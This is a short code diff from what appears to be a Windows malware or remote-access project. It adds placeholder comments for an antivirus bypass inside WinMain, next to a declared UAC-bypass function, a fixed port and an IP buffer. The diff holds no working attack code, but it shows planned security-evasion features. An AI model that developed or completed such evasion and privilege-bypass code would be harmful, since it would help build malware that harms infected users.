@@ -129,6 +129,12 @@ _Bool UACPASSING(char*);
 #define PORT 8080
 
 INT APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow) {
+	
+
+	//START bypass any AV
+	// TODO
+	//END bypass any AV
+
 	char current_file_name[MAX_PATH];
 	GetModuleFileNameA(NULL, current_file_name, MAX_PATH);
 	char* ip = (char*)malloc(100);
